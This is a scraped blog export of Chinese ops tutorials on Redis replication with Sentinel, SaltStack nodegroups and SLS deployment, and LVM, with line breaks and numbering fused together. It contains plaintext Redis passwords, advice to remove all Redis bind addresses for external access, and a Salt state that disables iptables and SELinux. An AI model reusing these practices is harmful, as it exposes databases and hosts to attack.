LISTEN 1381/sshdtcp 0 0 ::1:25 :::* LISTEN 1461/master 启动 slave ：12345678910111213[root@LAN_redis2 redis-3.2.1]#/usr/local/redis-3.2.1/src/redis-server /usr/local/redis-3.2.1/redis.conf &amp;[1]+ Done /usr/local/redis-3.2.1/src/redis-server /usr/local/redis-3.2.1/redis.conf [root@LAN_redis2 redis-3.2.1]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 192.168.1.174:10050 0.0.0.0:* LISTEN 3998/zabbix_agentdtcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 8192/redis-server *tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 3810/sshdtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1363/mastertcp 0 0 :::6379 :::* LISTEN 8192/redis-server *tcp 0 0 :::22 :::* LISTEN 3810/sshdtcp 0 0 ::1:25 :::* LISTEN 1363/master 主从测试并查看数据同步情况：master : 1234567891011121314[root@LAN_redis1 redis-3.2.1]# /usr/local/redis-3.2.1/src/redis-cli127.0.0.1:6379&gt;127.0.0.1:6379&gt; set name test(error) NOAUTH Authentication required.127.0.0.1:6379&gt; auth ghost+db@hz2016OK127.0.0.1:6379&gt; set name testOK127.0.0.1:6379&gt; saveOK127.0.0.1:6379&gt; set aa 123OK127.0.0.1:6379&gt; get aa\"123\" slave: 123456789101112[root@LAN_redis2 redis-3.2.1]# /usr/local/redis-3.2.1/src/redis-cli127.0.0.1:6379&gt;127.0.0.1:6379&gt;127.0.0.1:6379&gt; get aa(error) NOAUTH Authentication required.127.0.0.1:6379&gt; auth ghost+db@hz2016OK127.0.0.1:6379&gt; get aa\"123\"127.0.0.1:6379&gt;127.0.0.1:6379&gt; get name\"test\" 查看主从关系：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253[root@LAN_redis1 etc]# /usr/local/redis-3.2.1/src/redis-cli -a ghost+db@hz2016 -p 6379 info Replication# Replicationrole:masterconnected_slaves:2slave0:ip=192.168.1.174,port=6379,state=online,offset=57,lag=1slave1:ip=192.168.1.172,port=6379,state=online,offset=43,lag=1master_repl_offset:57repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:2repl_backlog_histlen:56``` 这里两slave，因为我把哨兵也加上了。### 安装Redis Sentinel配置 Sentinel是一个管理多个redis实例的工具，它可以实现对redis的监控、通知、自动故障转移。sentinel不断的检测redis实例是否可以正常工作，通过API向其他程序报告redis的状态，如果redis master不能工作，则会自动启动故障转移进程，将其中的一个slave提升为master，其他的slave重新设置新的master实例。也就是说，它提供了：监控（Monitoring）： Sentinel 会不断地检查你的主实例和从实例是否正常。通知（Notification）： 当被监控的某个 Redis 实例出现问题时， Sentinel 进程可以通过 API 向管理员或者其他应用程序发送通知。自动故障迁移（Automatic failover）： 当一个主redis实例失效时， Sentinel 会开始记性一次failover， 它会将失效主实例的其中一个从实例升级为新的主实例， 并让失效主实例的其他从实例改为复制新的主实例； 而当客户端试图连接失效的主实例时， 集群也会向客户端返回新主实例的地址， 使得集群可以使用新主实例代替失效实例。Redis Sentinel自身也是一个分布式系统， 你可以在一个架构中运行多个 Sentinel 进程， 这些进程使用流言协议（gossip protocols)来接收关于主Redis实例是否失效的信息， 然后使用投票协议来决定是否执行自动failover，以及评选出从Redis实例作为新的主Redis实例。同样在192.168.1.172 安装最新版的3.2.1 redis### 启动sentinel的方法当前Redis stable版已经自带了redis-sentinel这个工具。虽然 Redis Sentinel 已经提供了一个单独的可执行文件 redis-sentinel ， 但实际上它只是一个运行在特殊模式下的 Redis实例， 你可以在启动一个普通 Redis实例时通过给定 –sentinel 选项来启动 Redis Sentinel 实例。也就是说： redis-sentinel /etc/sentinel.conf等同于 redis-server /etc/sentinel.conf --sentinel其中sentinel.conf是redis的配置文件，Redis sentinel会需要写入配置文件来保存sentinel的当前状态。当配置文件无法写入时，Sentinel启动失败。并正确设置防火墙.### sentinel部署须知一个稳健的redis集群，应该使用至少三个sentinel实例，并且保证讲这些实例放到不同的机器上，甚至不同的物理区域。sentinel无法保证强一致性, 大概分布式环境都会有这方面的权衡.确保client库支持sentinel.sentinel需要通过不断的测试和观察，才能保证高可用。sentinel配合docker使用时，要注意端口映射带来的影响.``` bash 安装好了redis [root@sentinel redis-3.2.1]# cp /usr/local/redis-3.2.1/sentinel.conf /etc/sentinel.conf[root@LAN_redis2 redis-3.2.1]# cp /usr/local/redis-3.2.1/sentinel.conf /etc/sentinel.conf[root@LAN_redis1 redis-3.2.1]# cp /usr/local/redis-3.2.1/sentinel.conf /etc/sentinel.conf机器所有都拷贝一份,创建下面文件目录。[root@sentinel redis-3.2.1]# touch /var/log/redis/sentinel.log[root@sentinel redis-3.2.1]# touch /var/run/sentinel.pid 配置: 12345678910111213port 26379daemonize yeslogfile \"/var/log/redis/sentinel.log\"pidfile \"/var/run/sentinel.pid\"dir \"/tmp\"#Master 6379sentinel monitor mymaster 192.168.1.173 6379 2 sentinel down-after-milliseconds mymaster 5000sentinel parallel-syncs mymaster 10000 sentinel auth-pass mymaster redis4Hz@2015sentinel parallel-syncs mymaster 1sentinel failover-timeout mymaster 180000 其他两台一样配置。启动3个sentinel节点。 1[root@LAN_redis1 etc]# /usr/local/redis-3.2.1/src/redis-sentinel /etc/sentinel.conf --sentinel 查看节点是否都已经启动： 123[root@LAN_redis1 etc]# ps -ef | grep redis-sentinelroot 5992 1 0 15:06 ? 00:00:00 /usr/local/redis-3.2.1/src/redis-sentinel *:26379 [sentinel]root 5996 5574 0 15:07 pts/1 00:00:00 grep redis-sentinel 然后查看日志： 1234567891011[root@sentinel redis-3.2.1]# tailf /var/log/redis/sentinel.log | `-._`-._ _.-'_.-' | `-._ `-._`-.__.-'_.-' _.-' `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'9541:X 21 Jun 15:05:15.398 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.9541:X 21 Jun 15:05:15.406 # Sentinel ID is c1143e64b85a9ce321d4b33c5b463b7958477f379541:X 21 Jun 15:05:15.406 # +monitor master mymaster 192.168.1.173 6379 quorum 29541:X 21 Jun 15:05:20.406 # +sdown master mymaster 192.168.1.173 6379 这里的ID 在看看/etc/sentinel 的配置。 哨兵一配置 参考：sentinel1.conf123456789101112131415161718192021222324252627282930313233343536# Example sentinel.conf# port &lt;sentinel-port&gt;port 26371# 守护进程模式daemonize yes# 指明日志文件名logfile \"/var/log/redis/sentinel.log\"# 工作路径，sentinel一般指定/tmp比较简单dir /tmp# 哨兵监控这个master，在至少quorum个哨兵实例都认为master down后把master标记为odown# （objective down客观down；相对应的存在sdown，subjective down，主观down）状态。# slaves是自动发现，所以你没必要明确指定slaves。sentinel monitor TestMaster 127.0.0.1 7003 1# master或slave多长时间（默认30秒）不能使用后标记为s_down状态。sentinel down-after-milliseconds TestMaster 1500# 若sentinel在该配置值内未能完成failover操作（即故障时master/slave自动切换），则认为本次failover失败。sentinel failover-timeout TestMaster 10000# 设置master和slaves验证密码sentinel auth-pass TestMaster 0234kz9*lsentinel config-epoch TestMaster 15sentinel leader-epoch TestMaster 8394# #除了当前哨兵, 还有哪些在监控这个master的哨兵sentinel known-sentinel TestMaster 127.0.0.1 26372 0aca3a57038e2907c8a07be2b3c0d15171e44da5sentinel known-sentinel TestMaster 127.0.0.1 26373 ac1ef015411583d4b9f3d81cee830060b2f29862sentinel current-epoch 8394 master：sentinel.conf配置 123456789101112131415port 26379daemonize yeslogfile \"/var/log/redis/sentinel.log\"pidfile \"/var/run/sentinel.pid\"dir \"/tmp\"#Master 6379sentinel monitor mymaster 192.168.1.173 6379 2sentinel down-after-milliseconds mymaster 5000sentinel auth-pass mymaster redis4Hz@2015sentinel config-epoch mymaster 2919sentinel leader-epoch mymaster 2919# Generated by CONFIG REWRITEsentinel known-sentinel mymaster 192.168.1.174 26379 a3a6df103a7acaa56e4e6e9af63808dc9b525d1esentinel known-sentinel mymaster 192.168.1.172 26379 c1143e64b85a9ce321d4b33c5b463b7958477f37sentinel current-epoch 2926 slave : sentinel.conf配置： 12345678910111213141516port 26379daemonize yeslogfile \"/var/log/redis/sentinel.log\"pidfile \"/var/run/sentinel.pid\"dir \"/tmp\"#Master 6379sentinel monitor mymaster 192.168.1.173 6379 2sentinel down-after-milliseconds mymaster 5000sentinel auth-pass mymaster redis4Hz@2015sentinel config-epoch mymaster 2919sentinel leader-epoch mymaster 2918# Generated by CONFIG REWRITEsentinel known-sentinel mymaster 192.168.1.173 26379 ec452bf207d6cc720d3289180f66e9fa5a945f67sentinel known-sentinel mymaster 192.168.1.172 26379 c1143e64b85a9ce321d4b33c5b463b7958477f37sentinel current-epoch 2926 sentinel sentinel.conf配置： 12345678910111213141516port 26379daemonize yeslogfile \"/var/log/redis/sentinel.log\"pidfile \"/var/run/sentinel.pid\"dir \"/tmp\"#Master 6379sentinel monitor mymaster 192.168.1.173 6379 2sentinel down-after-milliseconds mymaster 5000sentinel auth-pass mymaster redis4Hz@2015sentinel config-epoch mymaster 2919sentinel leader-epoch mymaster 2926# Generated by CONFIG REWRITEsentinel known-sentinel mymaster 192.168.1.174 26379 a3a6df103a7acaa56e4e6e9af63808dc9b525d1esentinel known-sentinel mymaster 192.168.1.173 26379 ec452bf207d6cc720d3289180f66e9fa5a945f67sentinel current-epoch 2926 然后在重新启动一遍。 然后在查看下每台日志： 12345678910111213141516171819202122232425262728293031323334353637383940master :[root@LAN_redis2 redis-3.2.1]# tailf /var/log/redis/sentinel.log `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'8510:X 21 Jun 15:36:41.973 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.8510:X 21 Jun 15:36:41.974 # Sentinel ID is 59bd001bd3a719a2a53669db766ff6caf93cca338510:X 21 Jun 15:36:41.974 # +monitor master mymaster 192.168.1.173 6379 quorum 28510:X 21 Jun 15:36:46.999 # +sdown master mymaster 192.168.1.173 63798510:X 21 Jun 15:36:47.000 # +sdown sentinel c1143e64b85a9ce321d4b33c5b463b7958477f37 192.168.1.172 26379 @ mymaster 192.168.1.173 63798510:X 21 Jun 15:36:47.000 # +sdown sentinel ec452bf207d6cc720d3289180f66e9fa5a945f67 192.168.1.173 26379 @ mymaster 192.168.1.173 6379slave :master:[root@LAN_redis2 redis-3.2.1]# tailf /var/log/redis/sentinel.log `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'8510:X 21 Jun 15:36:41.973 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.8510:X 21 Jun 15:36:41.974 # Sentinel ID is 59bd001bd3a719a2a53669db766ff6caf93cca338510:X 21 Jun 15:36:41.974 # +monitor master mymaster 192.168.1.173 6379 quorum 28510:X 21 Jun 15:36:46.999 # +sdown master mymaster 192.168.1.173 63798510:X 21 Jun 15:36:47.000 # +sdown sentinel c1143e64b85a9ce321d4b33c5b463b7958477f37 192.168.1.172 26379 @ mymaster 192.168.1.173 63798510:X 21 Jun 15:36:47.000 # +sdown sentinel ec452bf207d6cc720d3289180f66e9fa5a945f67 192.168.1.173 26379 @ mymaster 192.168.1.173 6379sentinel:[root@sentinel redis-3.2.1]# tailf /var/log/redis/sentinel.log `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'9590:X 21 Jun 15:36:36.222 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.9590:X 21 Jun 15:36:36.223 # Sentinel ID is 54add3cbee8adc68b5b89f808a560a7425fd51669590:X 21 Jun 15:36:36.223 # +monitor master mymaster 192.168.1.173 6379 quorum 29590:X 21 Jun 15:36:41.262 # +sdown master mymaster 192.168.1.173 63799590:X 21 Jun 15:36:41.262 # +sdown sentinel a3a6df103a7acaa56e4e6e9af63808dc9b525d1e 192.168.1.174 26379 @ mymaster 192.168.1.173 63799590:X 21 Jun 15:36:41.262 # +sdown sentinel ec452bf207d6cc720d3289180f66e9fa5a945f67 192.168.1.173 26379 @ mymaster 192.168.1.173 6379 日志我先开着，然后我们关闭master这里我们都先关闭服务： 1234567891011121314151617181920212223master:[root@LAN_redis1 etc]# /usr/local/redis-3.2.1/src/redis-cli -a ghost+db@hz2016 -n 6379 shutdown然后在去查看sentinel 机器信息：[root@sentinel redis-3.2.1]# /usr/local/redis-3.2.1/src/redis-cli -a ghost+db@hz2016 -p 6379 info Replication# Replicationrole:slavemaster_host:192.168.1.174master_port:6379master_link_status:downmaster_last_io_seconds_ago:-1master_sync_in_progress:0slave_repl_offset:1master_link_down_since_seconds:1466495392slave_priority:100slave_read_only:1connected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0 这里master 已经主观转移 1234567891011121314151617# Replicationrole:slavemaster_host:192.168.1.174master_port:6379master_link_status:upmaster_last_io_seconds_ago:-1master_sync_in_progress:0slave_repl_offset:673master_link_down_since_seconds:49slave_priority:100slave_read_only:1connected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0 防火墙配置： 12-A INPUT -p tcp -m state --state NEW -m tcp --dport 6379 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 26379 -j ACCEPT 启动Sentinel使用–sentinel参数启动，并必须指定一个对应的配置文件，系统会使用配置文件来保存 Sentinel 的当前状态， 并在 Sentinel 重启时通过载入配置文件来进行状态还原。 redis-server /etc/sentinel.conf --sentinel 使用TCP端口26379，可以使用redis-cli或其他任何客户端与其通讯。 如果启动 Sentinel 时没有指定相应的配置文件， 或者指定的配置文件不可写（not writable）， 那么 Sentinel 会拒绝启动。 这里提个说明： 外网访问连不上解错误分析及解决办法错误的原因很简单，就是没有连接上redis服务，由于redis采用的安全策略，默认会只准许本地访问。需要通过简单配置，完成允许外网访问。修改redis的配置文件，将所有bind信息全部屏蔽。 123# bind 192.168.1.100 10.0.0.1# bind 192.168.1.8# bind 127.0.0.1 修改完成后，需要重新启动redis服务。 Redis 常见问题最大内存问题：要设置好最大内存，以防不停的申请内存，造成系统内存都被用完。 Fork 进程问题： ‘vm.overcommit_memory = 1’ 这一个选项要加到系统的配置中，防止 fork 因内存不足而失败。 密码问题：需要设置复杂一些，防止暴力破解。 修改 Linux 的防火墙(iptables)，开启你的redis服务端口，默认是6379 12-A INPUT -p tcp -m state --state NEW -m tcp --dport 6379 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 26379 -j ACCEPT 请注意，一定要将redis的防火墙配置放在 REJECT 的前面。然后执行 service iptables restart至此，访问刚刚上面的代码，就能够链接到redis服务，并且能够正确显示了。 可通过info 查看当前redis的状态，默认采用info default, 可采用info all 查看所有的信息状态； 通过 “info cpu” 单独查看cpu的状态信息，”info memory” “info replication” “info …”","raw":null,"content":null,"categories":[{"name":"Database","slug":"Database","permalink":"http://blog.yangcvo.me/categories/Database/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://blog.yangcvo.me/tags/Redis/"}]},{"title":"自动化运维工具--SaltStack-分组（使用记录,groups）","slug":"自动化+可视化/saltstack/自动化运维工具--SaltStack-分组（使用记录,groups） ","date":"2015-11-01T09:56:03.000Z","updated":"2017-03-29T11:42:09.000Z","comments":true,"path":"2015/11/01/自动化+可视化/saltstack/自动化运维工具--SaltStack-分组（使用记录,groups） /","link":"","permalink":"http://blog.yangcvo.me/2015/11/01/自动化+可视化/saltstack/自动化运维工具--SaltStack-分组（使用记录,groups） /","excerpt":"","text":"自动化运维工具–SaltStack-分组（使用记录,groups）在使用 SaltStack 对主机进行批量管理的时候，因为不同的服务器组所做的业务功能不同，因此为了更加方便的管理，为了便于管理功能业务相似的minion,Saltstack提供了分组的模式，因为线上机器多，不可能每次都是“*”或者“ip主机名” 这样不现实的。 所以我们现在都是提供分组，哪里的机器分哪个组这样你操作起来就方便而且容易排查，因此就自己在分组使用的过程中有以下一点记录下。 官方文档：http://docs.saltstack.com/topics/targeting/nodegroups.html 参考 SaltStack 的官方文档 4.4 Compound matchers 和 4.3. Node groups 知道，对目标服务器分组有以下七种方式，这七种方式的标示符分别为： G – 针对 Grains 做单个匹配，例如：G@os:Ubuntu E – 针对 minion 针对正则表达式做匹配，例如：E@web\\d+.(dev|qa|prod).loc P – 针对 Grains 做正则表达式匹配，例如：P@os:(RedHat|Fedora|CentOS) L – 针对 minion 做列表匹配，例如：L@minion1.example.com,minion3.domain.com or bl*.domain.com I – 针对 Pillar 做单个匹配，例如：I@pdata:foobar S – 针对子网或是 IP 做匹配，例如：S@192.168.1.0/24 or S@192.168.1.100 R – 针对客户端范围做匹配，例如： R@%foo.bar 然后我自己在做分组的时候，尝试了下 L 是否可以使用正则表达式 配置： 编辑配置文件 vi /etc/salt/master 这里大约706-714行：原文： 12345678##### Node Groups ################################################ Node groups allow for logical groupings of minion nodes. A group consists of a group# name and a compound target.#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com' 绿色的是指定组名：可以定义自己好记的组名，应用服务器是需要同样配置的，可以放在同一个分组。修改配置：注意：这里组名前面：需要空格，每个用户key名称，都逗号隔开。 12345#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com'ihaozhuo1: ''L@d_104_article_1,d_108_account_1,d_109_comm_1,d_110_consumer_1‘ihaozhuo2: 'L@api' 我们来测试下： -N 是指定分组名称： 执行命令 sudo salt -N “ihaozhuo1” test.ping结果为： 123456789101112[root@jumper ~]# salt -N 'ihaozhuo1' test.pingd_104_article_1: Trued_108_account_1: Trued_109_comm_1: Trued_110_consumer_1: True[root@jumper ~]# salt -N 'ihaozhuo2' test.pingapi: True 分组分好几台一起，是可以获取的。匹配指定的key 修改配置尝试一： 1234#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com'ihaozhuo1: ‘ L@JF1-TEST1-001,JF1-TEST1-002 or JF-TEST1-0[0-9][0-9]' 执行命令 sudo salt -N TEST1 test.ping结果为： 123456789101112JF1-TEST1-002: TrueJF1-TEST1-001: TrueJF1-TEST1-003: TrueJF1-TEST1-004: TrueJF1-TEST1-006: TrueJF1-TEST1-005: True 匹配了所有指定的key. 使用 L 列表的方式，必须把 minion 列出来，或者是列出几台后，在后面接 or 或者 and 表达式， or 或者 and 后面接的表达式后面可以使用正则表达式。 注：想使用正则表达式，最好的方式就是使用E","raw":null,"content":null,"categories":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/categories/Automation/"}],"tags":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"},{"name":"Saltstack","slug":"Saltstack","permalink":"http://blog.yangcvo.me/tags/Saltstack/"}]},{"title":"自动化运维工具--Saltstack写sls语法批量部署zabbix_agent","slug":"自动化+可视化/saltstack/自动化运维工具--Saltstack写sls语法批量部署zabbix_agent","date":"2015-11-01T09:56:03.000Z","updated":"2017-03-29T11:40:56.000Z","comments":true,"path":"2015/11/01/自动化+可视化/saltstack/自动化运维工具--Saltstack写sls语法批量部署zabbix_agent/","link":"","permalink":"http://blog.yangcvo.me/2015/11/01/自动化+可视化/saltstack/自动化运维工具--Saltstack写sls语法批量部署zabbix_agent/","excerpt":"","text":"Saltstack批量部署zabbix_agent服务12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576epel_install: file.managed: - name: /root/zabbix-release-2.4-1.el6.noarch.rpm ## 指定节点的epel安装包的存放路径 - source: salt://epel/zabbix-release-2.4-1.el6.noarch.rpm ## 指定从master的哪个位置拷贝epel的rpm包 - user: root ## 文件的拥有者 - group: root ## 文件的所属组 - mode: 777 - backup: minion cmd.run: - name: rpm -ivh /root/zabbix-release-2.4-1.el6.noarch.rpm ## 执行rpm包的安装 - unless: test -f /etc/yum.repos.d/epel.repo ## 如果存在这个文件就不再执行安装程序 - require: - file: epel_installSELINUX: cmd.run: - name: service iptables stop &amp;&amp; chkconfig iptables off &amp;&amp; setenforce 0 #sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config - require: - file: epel_installcache_yum: cmd.run: - name: yum makecache ## 生成yum的缓存 - require: - file: epel_install ## 生成缓存要在epel安装之后zabbix-agentd: pkg.installed: [] service.running:# - name: zabbix-agent# - running - enable: True - reload: True - watch: - file: /etc/zabbix/zabbix_agentd.conf - require: - file: epel_install/etc/zabbix/zabbix_agentd.conf: file.managed: - source: salt://zabbix/zabbix_agentd.conf - user: zabbix ## 文件的拥有者 - group: zabbix ## 文件的所属组 - mode: 644 - backup: minion - template: jinja - require: - file: epel_installntp: pkg.installed: [] ## 安装ntp # name: ntp service.running:# name: ntpd# running enable: True reload: True watch: file: /etc/ntp.conf require: ## 安装ntp要在epel安装之后 file: epel_install/etc/ntp.conf: file.managed: - source: salt://ntp/ntp.conf - user: root ## 文件的拥有者 - group: root ## 文件的所属组 - mode: 644 - backup: minion - require: - file: epel_install","raw":null,"content":null,"categories":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/categories/Automation/"}],"tags":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"},{"name":"Saltstack","slug":"Saltstack","permalink":"http://blog.yangcvo.me/tags/Saltstack/"}]},{"title":"LVM快速配置","slug":"LVM/LVM快速配置","date":"2015-10-21T06:51:19.000Z","updated":"2017-03-16T06:18:35.000Z","comments":true,"path":"2015/10/21/LVM/LVM快速配置/","link":"","permalink":"http://blog.yangcvo.me/2015/10/21/LVM/LVM快速配置/","excerpt":"","text":"fdisk -l ，列出所有存储设备，假设存在/dev/sdb和/dev/sda1两个存储设备，并且hdb有6个分区，其中sdb5、sdb6两个分区未使用，sda1为U盘 fdisk /dev/sdb，输入p查看hdb的分区情况及相应文件系统，输入t来更改文件系统，输入w保存退出，取消则输入q，具体例子如下： 12345678fdisk /dev/sdb Command (m for help): tPartition number (1-14): 5Hex code (type L to list codes): 8e Command (m for help): tPartition number (1-14): 6Hex code (type L to list codes): 8eCommand (m for help): w 创建PV，pvcreate /dev/sdb5 创建VG，vgcreate vg_name /dev/sdb6 VG名为vg_name，可以按照个人喜好更改. 创建LV，lvcreate -L 512m -n lv_name vg_name LV大小为512MB，LV名为lv_name，可以按照个人喜好更改 12lvcreate -l 40%VG -n lv_name vg_name LV使用40%的VG空间lvcreate --name lv_name -l 100%FREE vg_name LV使用所有剩余VG空间 格式化LV分区，mkfs.ext3 /dev/vg_name/lv_name 挂载LV分区到/mnt，mount /dev/vg_name/lv_name /mnt，可以使用df -h来查看/mnt的容量大小和使用百分比 卸载LV分区，umount /mnt LVM个人一直觉得特别好用，快速扩容在管理Hadoop存储服务器的时候发挥很大作用。","raw":null,"content":null,"categories":[],"tags":[{"name":"LVM","slug":"LVM","permalink":"http://blog.yangcvo.me/tags/LVM/"}]},{"title":"自动化运维工具--Saltstack安装部署配置使用","slug":"自动化+可视化/saltstack/自动化运维工具--Saltstack安装部署配置使用","date":"2015-10-10T09:56:03.000Z","updated":"2017-03-29T11:42:06.000Z","comments":true,"path":"2015/10/10/自动化+可视化/saltstack/自动化运维工具--Saltstack安装部署配置使用/","link":"","permalink":"http://blog.yangcvo.me/2015/10/10/自动化+可视化/saltstack/自动化运维工具--Saltstack安装部署配置使用/","excerpt":"","text":"自动化运维工具–Saltstack安装部署配置使用前言： 开始学saltstack的时候是在现在一家做CDN云加速的那是在2014年，salt刚刚出来所以我觉得我接触应该也算早的。 使用最多的同步下发的用到这个工具，下面我简单介绍和操作给大家看下。Salt 和 Puppet Chef 一样可以让你同时在多台服务器上执行命令也包括安装和配置软件。 Salt 有两个主要的功能：配置管理和远程执行。 Saltstack是一个大型分布式的配置管理系统（安装升级卸载软件，检测环境），也是一个远程命令执行系统。通过c/s的模型实现。服务器端对远程客户机的操作： ###（一）部署虚拟化环境 （1）两组服务器进行，操作系统版本为Centos release 6.4 RHEL 也可以。 （2）安装这个先安装下epel 由于现在网络RHEL官网yum源还没有 saltstack的安装包支持。因此先安装epel作为部署saltstack的默认yum源。 CenOs 5 版本: rpm -Uvh 下载地址：http://ftp.linux.ncsu.edu/pud/epel/6/i386/epel-release-5-4.noarch.rpm CenOs 6 版本: rpm -Uvh 下载地址：http://ftp.linux.ncsu.edu/pud/epel/6/i386/epel-release-6-8.noarch.rpm 百度云也可以去下载，我的是centos 64位的 http://pan.baidu.com/s/1eQGWboI (1) 主服务器 （主控端） IP：192.168.23.21 1234#rpm -ivh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm#yum install salt-master -y （安装salt-master）#chkconfig salt-master on#service salt-master start (2)从服务器安装 （被控端）IP：192.168.23.24 123#yum install salt-minion -y （安装salt-minion）#chkconfig salt-master on#service salt-master start 到这里已经安装完成。 Saltstack 防火墙配置 在主控端添加TCP 4505,TCP 4506 的规则，而在被控端无须配置防火墙，原理是被控端直接与主控端的zeromp建立链接。 接收 广播道任务信息并执行，具体操作是添加两条iptables规则： 12-A INPUT -m state --state new -m tcp -p tcp --dport 4505 -j ACCEPT-A INPUT -m state --state new -m tcp -p tcp --dport 4506 -j ACCEPT 默认配置文件位于/etc/salt/master ，默认不需要更改该配置文件。master端有两个端口需要在iptables上放行. 部署要求：两台机器网络互通，最好关闭防火墙。关闭selinux. 在启动下服务。 更新Saltstack 配置及安装效验。 Saltsatack 分两种，一种为master (主控制)，另一端为minion (被控端)，安装完毕后需要对两种角色的配置文件进行修改。 具体说明如下： （1） master 主控端配置 123456789 vim /etc/salt/master # 绑定Master 通信IP； interface :192.168.23.21 #自动认证，避免手动运行salt-key 来确认证书信任； auto-accept:True 修改/etc/hosts主机要添加被控机器的IP 和主机名192.168.23.24 xx.rix.com 服务端配置 主控端基本设置 编辑配置文件 /etc/salt/master,修改如下所示配置项，去掉前面的注释符 123interface: 192.168.23.21log_file: /var/log/salt/master # 记录主控端运行日志key_logfile: /var/log/salt/key # 记录认证证书日志 客户端配置 修改/etc/hosts 主机要添加服务端机器的IP 和主机名 1192.168.23.21 salt 受控端基本设置 编辑配置文件 /etc/salt/minion,修改如下所示配置项，去掉前面的注释符# 1234master: 192.168.23.21 # 设置主控端这里master设置主控端可以hosts名称：#master: salt前提是要设置hosts. 我这里直接配置的是主机名，也可以配置成IP地址，如果配置成主机名的话，就需要在/etc/hosts文件中master主机对应的IP ，如果使用内部DNS的例外，可以在内部DNS上的统一配置。 在其下增加一行内容为： 1- id: tomcatA1 这里是指定当前主机的id号，这在后面master认证和master调用命令执行时显示的名称，可以根据实际识别需要填写。另外需要注意的是，以上两处配置冒号后面都需要有一个空格，不然会报如下错误： 12log_file: /var/log/salt/minion # 记录受控端运行日志key_logfile: /var/log/salt/key # 记录认证证书日志 主控端和受控端 启动各自的服务，确保服务启动后没有任何报错信息,如果异常请检查相应日志文件处理 12主控端: service salt-master restart受控端: service salt-minion restart saltstack 主控端是依靠openssl证书来与受控端主机认证通讯的，受控端启动后会发送给主控端一个公钥证书文件，在主控端用 salt-key 命令来管理证书。 123salt-key -L # 用来查看证书情况salt-key -a 服务端名称或IP # 用来管理接受证书salt-key -A # 用来管理接受所有认证主机的认证 主控端和被控端的证书默认都存放在/etc/salt/pki/ 中，如果遇到证书不生效的情况下，可在主控端证书存放目录删除受控端证书，重新认证一下。 12345678910111213[root@ny-cloud-pagespeed00 ~]# salt-key -a 192.168.23.24The following keys are going to be accepted:Unaccepted Keys:192.168.23.24Proceed? [n/Y] y #这里输入y 代表同意加入证书。[root@ny-cloud-pagespeed00 minions]# salt -v \"xx.rix.com\" test.ping #这里的.com是受控机的hostname 认证名称。Executing job with jid 20151004162442004183 -------------------------------------------xx.rix.com:True 这里可以获取到认证，那么我们把认证加进去。 123456789101112131415161718192021[root@salt ~]# salt-key -LAccepted Keys:Gateway1Gateway2ihaozhuo1ihaozhuo2nodeopenapireport1report2tomcat_A1tomcat_A2tomcat_B1tomcat_B2tomcat_bmwtomcat_C1tomcat_C2weixinDenied Keys:Unaccepted Keys:Rejected Keys: 我上面用的-A参数，该参数意思是接受所有认证主机的认证，也可以使用 -a id名 只认证单独的主机。默认认证完成后会在/etc/salt/pki/master/minions目录找到以ID名命令的文件，里面存放的是密钥文件。 如果对客户端信任，可以让master自动接受请求，在master端/etc/salt/master配置。 （二）命令执行True代表正常，*代表所有主机，也可以选择单台或者按组及正则进行匹配等，这个可以参看下官方相关文档 。其默认执行的正则是shell正则，也可以使用其他正则或组等，如下： 12345678910111213141516171819202122232425262728293031323334[root@salt ~]# salt '*' test.ping[root@salt ~]# salt '*' test.pingtomcat_C2: Truetomcat_B2: Trueihaozhuo1: Trueihaozhuo2: Trueopenapi: Truetomcat_B1: Truetomcat_C1: Trueweixin: Truetomcat_A1: Truetomcat_A2: Truenode: TrueGateway2: Truereport1: Truereport2: Truetomcat_bmw: TrueGateway1: Minion did not return. [Not connected] 这里可以看到有一台ping不通，就应该上去查看下。 12345678[root@Gateway1 ~]# ps -ef | grep minionroot 15343 15168 0 11:22 pts/0 00:00:00 grep --color=auto minion[root@Gateway1 ~]# service salt-minion startRedirecting to /bin/systemctl start salt-minion.service[root@Gateway1 ~]# ps -ef | grep minionroot 15422 1 7 11:22 ? 00:00:00 /usr/bin/python /usr/bin/salt-minionroot 15431 15422 46 11:22 ? 00:00:00 /usr/bin/python /usr/bin/salt-minionroot 15494 15168 0 11:22 pts/0 00:00:00 grep --color=auto minion 